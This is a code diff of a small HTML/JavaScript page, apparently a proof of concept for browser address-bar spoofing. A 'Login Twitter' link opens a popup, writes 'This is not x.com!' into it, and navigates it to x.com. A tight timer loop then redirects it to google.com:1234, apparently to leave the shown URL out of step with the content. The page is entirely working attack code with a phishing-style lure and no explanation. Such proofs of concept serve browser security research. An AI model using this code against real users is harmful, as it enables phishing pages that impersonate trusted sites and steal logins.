@@ -1,37 +1,14 @@
 <script>
-  function next() {
-    // Redirect langsung ke halaman tujuan
-    w.location.replace('https://www.google.com:1234');
-  }
-
-  function f() {
-    // Membuka jendela baru
-    w = window.open("");  
-    w.document.write('<h2>This is not x.com!</h2>');
-
-    // Memulai pengalihan pertama ke x.com
-    setTimeout(function() {
-      w.location = "https://x.com"; // Redirect ke x.com
-    }, 500); // Delay untuk memberi waktu pada pop-up
-
-    // Membuat efek bounce balik-balik pada lokasi dengan interval
-    i = setInterval(function() {
-      try {
-        let currentUrl = w.location.href;
-
-        if (currentUrl === "https://x.com") {
-          // Ketika sudah berada di x.com, biarkan halaman tetap di situ
-          clearInterval(i);
-        } else {
-          // Bounce balik-balik: Redirect balik ke Google setelah beberapa saat
-          next();
-        }
-      } catch (e) {
-        // Jika ada error, hentikan interval
-        clearInterval(i);
-      }
-    }, 100); // Interval yang lebih stabil (100ms)
-  }
-</script>
-
-<a href="#" onclick="f()">Login Twitter</a>
+    function next() {
+           w.location.replace('https://www.google.com:1234');
+          }
+  
+    function f() {
+      w = window.open("");
+      w.document.write('<h2>This is not x.com!</h2>');
+      w.location = "https://x.com";
+      i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+    }
+  </script>
+  
+  <a href="#" onclick="f()">LOGIN Twitter</a>
